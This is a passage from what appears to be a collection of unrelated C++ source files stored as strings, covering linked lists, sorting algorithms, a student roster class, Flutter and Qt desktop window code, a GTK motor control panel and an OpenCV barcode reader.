 cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is ascending order of roll number are:  \" << endl;\n        Node* currentNode = START;              //STEP 1\n        while (currentNode != NULL)             //STEP 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;         //STEP 3\n            currentNode = currentNode->next;                                        //STEP 4\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is descending order of roll number are:  \" << endl;\n        Node* currentNode = START;\n        while (currentNode->next != NULL)\n      ",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nint partition(vector<int>& arr, int low, int high) {\r\n    int pivot = arr[high];\r\n    int i = low - 1;\r\n    for (int j = low; j < high; j++) {\r\n        if (arr[j] <= pivot) {\r\n            i++;\r\n            swap(arr[i], arr[j]);\r\n        }\r\n    }\r\n    swap(arr[i + 1], arr[high]);\r\n    return i + 1;\r\n}\r\n\r\nvoid quickSort(vector<int>& arr, int low, int high) {\r\n    if (low < high) {\r\n        int pi = partition(arr, low, high);\r\n        quickSort(arr, low, pi - 1);\r\n        quickSort(arr, pi + 1, high);\r\n    }\r\n}\r\n\r\nvoid findSwappedElements(vector<int>& arr) {\r\n    int first = -1, second = -1;\r\n    int n = arr.size();\r\n    for (int i = 0; i < n - 1; i++) {\r\n        if (arr[i] > arr[i + 1]) {\r\n            if (first == -1) {\r\n                first = i;\r\n            } else {\r\n                second = i + 1;\r\n                break;\r\n            }\r\n        }\r\n    }\r\n    if (second == -1) {\r\n        // No elements were swapped\r\n        return;\r\n    }\r\n    swap(arr[first], arr[second]);\r\n}\r\n\r\nint main() {\r\n    vector<int> arr = {3, 8, 6, 7, 5, 9, 10};\r\n    cout << \"Original array:\" << endl;\r\n    for (int num : arr) {\r\n        cout << num << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    findSwappedElements(arr);\r\n    quickSort(arr, 0, arr.size() - 1);\r\n\r\n    cout << \"Sorted array after fixing the swapped elements:\" << endl;\r\n    for (int num : arr) {\r\n        cout << num << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\n#include <string>\r\n#include <sstream>\r\n#include \"roster.h\"\r\n#include \"student.h\"\r\nusing std::string;\r\n\r\nRoster::Roster(const string students[]) {\r\n\r\n    int arrSize{sizeof(*students) / sizeof(students)}; // Calculates number of elements in students\r\n\r\n    for (size_t i{0}; i < arrSize; i++) {\r\n        string student{students[i]}; // All info for one student\r\n\r\n        // Store student information separated by comma into array of strings\r\n        string student_info[6 + 3]; // 7 attributes, one is an array of 3 elements\r\n        std::stringstream s_student(student);\r\n        int info_i{0};\r\n        while (s_student.good()) {\r\n            string substr;\r\n            getline(s_student, substr, ',');\r\n            student_info[info_i] = substr;\r\n            info_i++;\r\n        }\r\n\r\n        // String values, direct initialization\r\n        string student_id{student_info[0]};\r\n        string student_first{student_info[1]};\r\n        string student_last{student_info[2]};\r\n        string student_email{student_info[3]};\r\n\r\n        // Int values, must convert string to int\r\n        int student_age{std::stoi(student_info[4], nullptr, 0)};\r\n        int student_days[3]{\r\n            std::stoi(student_info[5], nullptr, 0),\r\n            std::stoi(student_info[6], nullptr, 0),\r\n            std::stoi(student_info[7], nullptr, 0)\r\n        };\r\n\r\n        // DegreeProgram value, must assign based on string input\r\n        string chosen_program{student_info[8]};\r\n        DegreeProgram student_program{};\r\n        if (chosen_program == \"SECURITY\")\r\n            student_program = DegreeProgram::SECURITY;\r\n        else if (chosen_program == \"NETWORK\")\r\n            student_program = DegreeProgram::NETWORK;\r\n        else if (chosen_program == \"SOFTWARE\")\r\n            student_program = DegreeProgram::SOFTWARE;\r\n        else\r\n            throw std::invalid_argument(\"Degree Program isn't valid.\");\r\n\r\n        // Create Student object\r\n        *(classRosterArray + i) = new Student {\r\n            student_id,\r\n            student_first,\r\n            student_last,\r\n            student_email,\r\n            student_age,\r\n            student_days,\r\n            student_program\r\n        };\r\n    }\r\n}\r\n\r\nint Roster::maxStudents() { // Returns the max number of students\r\n    return sizeof(classRosterArray) / sizeof(*classRosterArray);\r\n}\r\n\r\nint Roster::studentIndexById(string studentID) {\r\n    int found{-1};\r\n    for (int i{0}; i < firstEmptySpot(); i++) {\r\n        Student* current_student = classRosterArray[i];\r\n        if (current_student->getId() == studentID) {\r\n            found = i;\r\n            break;\r\n        }\r\n    }\r\n    return found;\r\n}\r\n\r\nsize_t Roster::firstEmptySpot() {\r\n    size_t empty_index{};\r\n    int arrSize{maxStudents()}; // Max number of students\r\n    for (int i{0}; i < arrSize; i++)\r\n        if (i == (arrSize - 1)) {\r\n            empty_index = arrSize;\r\n        }\r\n        else if (classRosterArray[i] == NULL) {\r\n            empty_index = i;\r\n            break;\r\n        }\r\n    return empty_index;\r\n}\r\n\r\nvoid Roster::add(string studentID, string firstName, string lastName, string emailAddress, int age, int daysInCourse1, int daysInCourse2, int daysInCourse3, DegreeProgram degreeprogram) {\r\n    // Convert daysInCourse# to array\r\n    int daysInCourses[]{\r\n        daysInCourse1,\r\n        daysInCourse2,\r\n        daysInCourse3\r\n    };\r\n\r\n    // Find empty spot on roster array\r\n    size_t empty_index{firstEmptySpot()};\r\n\r\n    // Add to roster\r\n    *(classRosterArray + empty_index) = new Student{\r\n        studentID,\r\n        firstName,\r\n        lastName,\r\n        emailAddress,\r\n        age,\r\n        daysInCourses,\r\n        degreeprogram\r\n    };\r\n}\r\n\r\nvoid Roster::remove(string studentID) {\r\n    int arrSize{maxStudents()}; // Max number of students\r\n    \r\n    // Find index of student with id\r\n    int found{studentIndexById(studentID)};\r\n    if (found == -1) {\r\n        std::cout << std::endl << \"Could not find student ID \\\"\" << studentID << \"\\\" in roster.\" << std::endl;\r\n    }\r\n    // Delete student\r\n    else {\r\n        delete classRosterArray[found];\r\n\r\n        // Move remaining students down on array\r\n        for (int i{found}; i < (arrSize - 1); i++) {\r\n            classRosterArray[i] = classRosterArray[i + 1];\r\n        }\r\n        Student* new_last[1] {}; // Workaround to duplicate behavior of initial student pointer array\r\n        classRosterArray[arrSize - 1] = new_last[0];\r\n    }\r\n}\r\n\r\nvoid Roster::printAll() {\r\n    size_t empty_index{firstEmptySpot()};\r\n    for (size_t i{0}; i < empty_index; i++) {\r\n        Student* current_student = classRosterArray[i];\r\n        current_student->print();\r\n    }\r\n    std::cout << std::endl;\r\n}\r\n\r\nvoid Roster::printAverageDaysInCourse(string studentID) {\r\n    // Point to desired student\r\n    Student* current_student{classRosterArray[studentIndexById(studentID)]};\r\n\r\n    // Calculate average\r\n    int sumDays{current_student->getCompletionDay(1) + current_student->getCompletionDay(2) + cu",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\n/******************************************************************************\n\n    C++ Script License - Version 1.0\n    Author: Gayan Brahmanage, Ph.D.\n    Contact: gayansampathefac@gmail.com\n    LinkedIn: https://www.linkedin.com/in/gayan-brahmanage/\n    GitHub: https://github.com/gayanbrahmanage\n\n    This C++ script is licensed under the terms of the MIT license. Please see\n    the following terms and conditions:\n\n    Permission is hereby granted, free of charge, to any person obtaining a copy\n    of this software and associated documentation files (the \"Software\"), to deal\n    in the Software without restriction, including without limitation the rights\n    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n    copies of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included in\n    all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n    THE SOFTWARE.\n\n******************************************************************************/\n#include \"gui.h\"\n\ngui::gui():boxMain(Gtk::ORIENTATION_VERTICAL,5), // Main\n          frame_base_window(\"Base\"),\n          boxBase(Gtk::ORIENTATION_VERTICAL), //left\n          sbtn_manual(100,50, sbtn_manual_name, 0.2,0.2,0.2),\n          base(250,250),\n          frame_motor1_window(\"Motor L\"),\n          boxMotor1(Gtk::ORIENTATION_HORIZONTAL),\n          sbtn_Brake1(50,50, Brake1_str, 0.2,0.2,0.2),\n          sbtn_Dir1(50,50, Dir1_str, 0.2,0.2,0.2),\n\n          frame_motor2_window(\"Motor R\"),\n          boxMotor2(Gtk::ORIENTATION_HORIZONTAL),\n          sbtn_Brake2(50,50, Brake2_str, 0.2,0.2,0.2),\n          sbtn_Dir2(50,50, Dir2_str, 0.2,0.2,0.2),\n\n          frame_text_window(\"\"),\n          boxText(Gtk::ORIENTATION_VERTICAL)\n\n        {   // creates a new button with label \"Hello World\".\n\n        // Sets the border width of the window.\n        set_title(\"KELLA-Contol Panel\");\n        //set_default_size(1260, 820);\n        boxMain.set_border_width(10);\n        add(boxMain);\n\n        boxMain.pack_start(frame_base_window);\n        boxBase.set_border_width(5);\n        frame_base_window.add(boxBase);\n        boxBase.pack_start(sbtn_manual, FALSE, FALSE, 0);\n        boxBase.pack_start(base, FALSE, FALSE, 0);\n\n\n        boxBase.pack_start(frame_motor1_window);\n        boxMotor1.set_border_width(5);\n        frame_motor1_window.add(boxMotor1);\n        auto infoBarContainer1 =dynamic_cast<Gtk::Container*>(InfoBar1.get_content_area());\n        if (infoBarContainer1) infoBarContainer1->add(Message_Label1);\n        boxMotor1.pack_start(InfoBar1, Gtk::PACK_SHRINK);\n        boxMotor1.pack_start(sbtn_Brake1, FALSE, FALSE, 0);\n        boxMotor1.pack_start(sbtn_Dir1, FALSE, FALSE, 0);\n\n        boxBase.pack_start(frame_motor2_window);\n        boxMotor2.set_border_width(5);\n        frame_motor2_window.add(boxMotor2);\n        auto infoBarContainer2 =dynamic_cast<Gtk::Container*>(InfoBar2.get_content_area());\n        if (infoBarContainer2) infoBarContainer2->add(Message_Label2);\n        boxMotor2.pack_start(InfoBar2, Gtk::PACK_SHRINK);\n        boxMotor2.pack_start(sbtn_Brake2, FALSE, FALSE, 0);\n        boxMotor2.pack_start(sbtn_Dir2, FALSE, FALSE, 0);\n\n        boxMain.pack_start(frame_text_window);\n        boxText.set_border_width(5);\n        frame_text_window.add(boxText);\n        TextBuffer = Gtk::TextBuffer::create();\n        TextView.set_buffer(TextBuffer);\n        text_ScrolledWindow.add(TextView);\n        text_ScrolledWindow.set_policy(Gtk::POLICY_AUTOMATIC, Gtk::POLICY_AUTOMATIC);\n        boxText.pack_start(text_ScrolledWindow);\n\n\n        // dispatcher\n        Dispatcher_esp32.connect(sigc::mem_fun(*this, &gui::on_notification_from_thread_esp32));\n        Dispatcher_jstick.connect(sigc::mem_fun(*this, &gui::on_notification_from_thread_jstick));\n\n        show_all_children();\n}\n\ngui::~gui(){\n\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"SettingsWindow.hpp\"\r\n\r\n#include <QDialogButtonBox>\r\n#include <QTabWidget>\r\n#include <QLabel>\r\n#include <QComboBox>\r\n#include <QSpinBox>\r\n#include <QToolButton>\r\n#include <QButtonGroup>\r\n#include <QCheckBox>\r\n#include <QGroupBox>\r\n#include <QAbstractButton>\r\n#include <QVBoxLayout>\r\n#include <QHBoxLayout>\r\n#include <QGridLayout>\r\n\r\n\r\nSettingsWindow::SettingsWindow(Settings& externalSettings) :\r\n\tQDialog{nullptr, Qt::MSWindowsFixedSizeDialogHint},\r\n\tmExternalSettings{externalSettings},\r\n\tmButtonBox{new QDialogButtonBox},\r\n\tmSettingsTabs{new QTabWidget},\r\n\tmSortingAlogorithmsComboBox{new QComboBox},\r\n\tmInputDataSizeSpinBox{new QSpinBox},\r\n\tmZeroArrayValuesButton{new QToolButton},\r\n\tmGenerateAscendingArrayValuesButton{new QToolButton},\r\n\tmGenerateRandomArrayValuesButton{new QToolButton},\r\n\tmGenerateDescendingArrayValuesButton{new QToolButton},\r\n\tmGenerateButtonGroup{new QButtonGroup},\r\n\tmRepeatedValuesCheckBox{new QCheckBox}\r\n\r\n{\r\n\tsetAttribute(Qt::WA_DeleteOnClose);\r\n\tsetWindowTitle(QStringLiteral(\"Ustawienia aplikacji\"));\r\n\tsetWindowIcon(QIcon(QStringLiteral(\":/Resources/Settings.png\")));\r\n\tsetWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint);\r\n\tsetContextMenuPolicy(Qt::NoContextMenu);\r\n\r\n\tcreateWidgets();\r\n\tcreateConnections();\r\n\tcreateLayout();\r\n\r\n\tresetParameters();\r\n}\r\n\r\nvoid SettingsWindow::createWidgets()\r\n{\r\n\tmButtonBox->addButton(QDialogButtonBox::StandardButton::Ok);\r\n\tmButtonBox->addButton(QDialogButtonBox::StandardButton::Cancel);\r\n\tmButtonBox->addButton(QDialogButtonBox::StandardButton::Reset);\r\n\r\n\tmSettingsTabs->addTab(createGeneralSettingsWidget(), QStringLiteral(\"Og\u00f3lne\"));\r\n\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez wstawianie\"), QVariant::fromValue(SortingAlgorithmType::InsertionSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez wybieranie\"), QVariant::fromValue(SortingAlgorithmType::SelectionSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie b\u0105belkowe\"), QVariant::fromValue(SortingAlgorithmType::BubbleSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez scalanie\"), QVariant::fromValue(SortingAlgorithmType::MergeSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez kopcowanie\"), QVariant::fromValue(SortingAlgorithmType::HeapSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie szybkie (Lomuto)\"), QVariant::fromValue(SortingAlgorithmType::QuickSortLomuto));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie szybkie (Hoare)\"), QVariant::fromValue(SortingAlgorithmType::QuickSortHoare));\r\n\r\n\tmSortingAlogorithmsComboBox->setCurrentIndex(-1);\r\n\r\n\tmInputDataSizeSpinBox->setRange(2, Settings::ArrayFixedSize);\r\n\tmInputDataSizeSpinBox->setValue(2);\r\n\r\n\tmZeroArrayValuesButton->setText(QStringLiteral(\"Wyzeruj elementy\"));\r\n\tmZeroArrayValuesButton->setFixedHeight(23);\r\n\r\n\tmGenerateAscendingArrayValuesButton->setText(\"Kolejno\u015b\u0107 rosn\u0105ca\");\r\n\tmGenerateAscendingArrayValuesButton->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\r\n\tmGenerateAscendingArrayValuesButton->setIcon(QIcon(\":/Resources/Ascending.png\"));\r\n\tmGenerateAscendingArrayValuesButton->setIconSize(QSize(68, 24));\r\n\tmGenerateAscendingArrayValuesButton->setFixedSize(mGenerateAscendingArrayValuesButton->sizeHint());\r\n\r\n\tmGenerateRandomArrayValuesButton->setText(\"Kolejno\u015b\u0107 losowa\");\r\n\tmGenerateRandomArrayValuesButton->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\r\n\tmGenerateRandomArrayValuesButton->setIcon(QIcon(\":/Resources/Random.png\"));\r\n\tmGenerateRandomArrayValuesButton->setIconSize(QSize(68, 24));\r\n\tmGenerateRandomArrayValuesButton->setFixedSize(mGenerateAscendingArrayValuesButton->sizeHint());\r\n\r\n\tmGenerateDescendingArrayValuesButton->setText(\"Kolejno\u015b\u0107 malej\u0105ca\");\r\n\tmGenerateDescendingArrayValuesButton->setToolTip(\"Wygeneruje dla wszystkich element\u00f3w warto\u015bci w kolejno\u015bci malej\u0105cej\");\r\n\tmGenerateDescendingArrayValuesButton->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\r\n\tmGenerateDescendingArrayValuesButton->setIcon(QIcon(\":/Resources/Descending.png\"));\r\n\tmGenerateDescendingArrayValuesButton->setIconSize(QSize(68, 24));\r\n\tmGenerateDescendingArrayValuesButton->setFixedSize(mGenerateAscendingArrayValuesButton->sizeHint());\r\n\r\n\tmGenerateButtonGroup->addButton(mZeroArrayValuesButton, GenerateButtonID::ZeroArrayValuesButton);\r\n\tmGenerateButtonGroup->addButton(mGenerateAscendingArrayValuesButton, GenerateButtonID::AscendingArrayValuesButton);\r\n\tmGenerateButtonGroup->addButton(mGenerateRandomArrayValuesButton, GenerateButtonID::RandomArrayValuesButton);\r\n\tmGenerateButtonGroup->addButton(mGenerateDescendingArrayValuesButton, GenerateButtonID::DescendingArrayValuesButton);\r\n\r\n\tmRepeatedValuesCheckBox->setText(QStringLiteral(\"Powtarzaj\u0105ce si\u0119 warto\u015bci\"));\r\n\tmRepeatedValuesCheckBox->setChecked(true);\r\n\tmRepeatedValuesCheckBox->setToolTip(\"Mo\u017cliwe wyst\u0105pienie identycznych warto\u015bci podczas losowego generowania\");\r\n}\r\n\r\nvoid SettingsWindow::createConnections()\r\n{\r",
    "// Track_Detector.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n#include <iostream>\r\n#include <vector>\r\n#include <opencv2/opencv.hpp>\r\n#include <opencv2/core/core.hpp>\r\n#include <opencv2/highgui/highgui.hpp>\r\n#include <opencv2/imgproc.hpp>\r\n#include <string>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\nusing namespace cv;\r\nconst char* image_window = \"Source Image\";\r\n//const char* result_window = \"Result window\";\r\nint font_size = 1;\r\nScalar font_color(0, 0, 0);\r\nint font_weight = 2;\r\n\r\nvoid save(Mat image,string path) {\r\n    bool isSuccess = imwrite(path, image);\r\n    if (isSuccess == false) {\r\n        cout << \"Failed to save image\" << endl;\r\n        cin.get();\r\n    }\r\n    else {\r\n        cout << \"Image saved\" << endl;\r\n    }\r\n}\r\n\r\nint** TemplateMatching(Mat source, Mat templ, int objectNum) {\r\n    int** arr = new int* [objectNum];\r\n    Mat result;\r\n    double minVal;\r\n    double maxVal;\r\n    Point minLoc;\r\n    Point matchLoc;\r\n    Point maxLoc;\r\n    int j = 0;\r\n    for (int k = 0; k < objectNum; k++, j++) {\r\n        matchTemplate(source, templ, result, TM_SQDIFF_NORMED);\r\n        minMaxLoc(result, &minVal, &maxVal, &minLoc, &maxLoc, Mat());\r\n        matchLoc = minLoc;\r\n        arr[k] = new int[objectNum];\r\n        arr[k][0] = matchLoc.x;\r\n        arr[k][1] = matchLoc.y;\r\n        for (int i = 0; i < templ.cols; i++) {\r\n            for (int j = 0; j < templ.rows; j++) {\r\n                source.at<Vec2b>(matchLoc.y + j, (matchLoc.x + i) / 2) = 0;\r\n            }\r\n        }\r\n    }\r\n    return arr;\r\n}\r\n\r\nint Table(int binary) {\r\n    switch (binary) {\r\n    case(21100001):\r\n        return 1;\r\n        break;\r\n    case(21010010):\r\n        return 2;\r\n        break;\r\n    case(10110011):\r\n        return 3;\r\n        break;\r\n    case(20110100):\r\n        return 4;\r\n        break;\r\n    case(11010101):\r\n        return 5;\r\n        break;\r\n    case(11100110):\r\n        return 6;\r\n        break;\r\n    case(20000111):\r\n        return 7;\r\n        break;\r\n    case(11111000):\r\n        return 8;\r\n        break;\r\n    case(20011001):\r\n        return 9;\r\n        break;\r\n    case(20101010):\r\n        return 0;\r\n        break;\r\n    default:\r\n        return 0;\r\n        break;\r\n    }\r\n}\r\n\r\nvoid Barcode(Mat source, int x, int y, Mat templ) {\r\n    int barcode[80];\r\n    memset(barcode, 0, sizeof(barcode));\r\n    int textNum[10];\r\n    memset(textNum, 0, sizeof(textNum));\r\n    int adjust;\r\n    std::ostringstream oss;\r\n    for (int N = 0; N < 2; N++) {\r\n        int test = 0;\r\n        int index = 0;\r\n        int count = 0;\r\n        int width = 29;\r\n        int norm = 12;\r\n        int threshold = 100;\r\n        while (index != 100) {\r\n            test = int(source.at<Vec2b>(y + index, x / 2 + 66 - N * 44)[0]);\r\n            if (test < threshold - 10 && test > 50) {\r\n                count += 1;\r\n            } //makes sure its a barcode value and not random black dot\r\n            if (count > 2 && test > threshold - 20) {  //found barcode\r\n                for (int i = 0; i < 40; i++) {//barcode sections\r\n                    for (int n = 0; n < 29; n++) {//each section value\r\n                        barcode[i + N * 40] += source.at<Vec2b>(y + index - count / 2 - norm + i * 29 + n, x / 2 + 66 - N * 44)[0];\r\n                    }//total value of each section\r\n                    if (barcode[i + N * 40] / width > threshold) {\r\n                        barcode[i + N * 40] = 0;\r\n                    }\r\n                    else {\r\n                        barcode[i + N * 40] = 1;\r\n                    }\r\n                }\r\n                index = 100;\r\n            }\r\n            else {\r\n                index += 1;\r\n            }\r\n        }\r\n    }\r\n    for (int i = 0; i < 10; i++) {\r\n        for (int j = 0; j < 8; j++) {\r\n            if (j == 0) {\r\n                adjust = 1;\r\n            }\r\n            else {\r\n                adjust = 0;\r\n            }\r\n            textNum[i] += (barcode[i * 8 + j] + adjust) * pow(10, 7 - j);\r\n        }\r\n        textNum[i] = Table(textNum[i]);\r\n    }\r\n    oss << \"Photo: \" << textNum[1] << textNum[2] << textNum[3] << textNum[4] << \"; Roll: \" << textNum[6] << textNum[7] << textNum[8] << textNum[9] << \"; Cam: \" << textNum[5] << \"; Expan: \" << textNum[0];\r\n    std::string var = oss.str();\r\n    Point text_position(source.cols / 2, y / 2);\r\n    putText(source, var, text_position, FONT_HERSHEY_COMPLEX, font_size, font_color, font_weight);\r\n}\r\n\r\nvoid find_track(Mat source,int x, int y) {\r\n    int j = 0;\r\n    int count = 0;\r\n    int test;\r\n    //rectangle(source, Point(500, 500), Point(600, 600), Scalar(0, 0, 255));\r\n    while (j == 0) {\r\n        test = int(source.at<Vec2b>(y + count, x)[0]);\r\n        cout << count << endl;\r\n        if (test < 90 && test > 50) {\r\n            rectangle(source,Point(y+count,x),Point(y + count + 100,x + 100),Scalar(0,255,255));\r\n            j = 1;\r\n        }\r\n        count += 1;\r\n        if (count > 1000) {\r\n            rectangle(source, Point(y + count, x), Point(y ",
    "#include <chrono>\n#include <iostream>\n#include <unistd.h>\n#include <numeric>\n#include <algorithm>\n#include <vector>\n#include \"SortingAlgorithm.hpp\"\n#include <iomanip>\n\nusing namespace std;\n\ntemplate<typename T>\ndouble TimeBubble(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::BubbleSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\ntemplate<typename T>\ndouble TimeMerge(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::MergeSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\n\nint main(int argc, char ** argv)\n{\n    int n = 0;\n    size_t dimv = stoi(argv[1]);\n    unsigned int iters = 100;\n    vector<int> v(dimv);\n    double time_Bubble = 0;\n    double time_Merge = 0;\n\n    cout << scientific << setprecision(4);\n    // Vector of random integers in range 0-987\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            v[i] = rand() % 987;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v = time_Bubble/iters;\n    double time_MergeSort_v = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v << endl\n         << \"MergeSort : \" << time_MergeSort_v << endl << endl;\n\n\n    // Vector of random doubles in range 0-1\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    vector<double> w(dimv);\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned 